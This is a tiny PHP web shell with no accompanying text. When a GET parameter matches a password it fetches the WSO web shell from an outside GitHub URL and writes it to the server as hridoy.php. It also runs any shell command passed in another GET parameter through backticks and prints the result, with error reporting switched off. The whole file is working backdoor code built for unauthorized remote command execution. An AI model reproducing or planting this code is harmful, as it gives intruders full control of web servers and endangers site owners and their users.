<?php
error_reporting(0);
if ($_GET["hridoy"]=="orion") {
	file_put_contents("hridoy.php", file_get_contents("https://raw.githubusercontent.com/orionhridoy/wso-without-backdoor/main/wso.php"));
}
$x=$_GET['orion'];
echo `$x`;

?>